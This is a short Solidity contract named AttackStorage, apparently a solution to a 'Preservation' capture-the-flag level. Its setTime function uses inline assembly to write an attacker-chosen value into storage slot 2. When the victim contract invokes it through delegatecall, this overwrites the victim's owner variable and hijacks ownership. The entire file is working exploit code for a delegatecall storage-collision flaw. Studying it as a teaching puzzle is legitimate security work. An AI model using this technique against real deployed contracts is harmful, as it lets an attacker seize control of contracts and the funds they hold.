pragma solidity ^0.8.0;
contract AttackStorage {
    function setTime(uint256 _time) external {
        // Overwrite owner slot in Preservation contract (slot 2 in its storage)
        // When this is called via delegatecall, we'll directly manipulate
        // the Preserve's owner variable
        assembly {
            sstore(2, _time)
        }
    }
}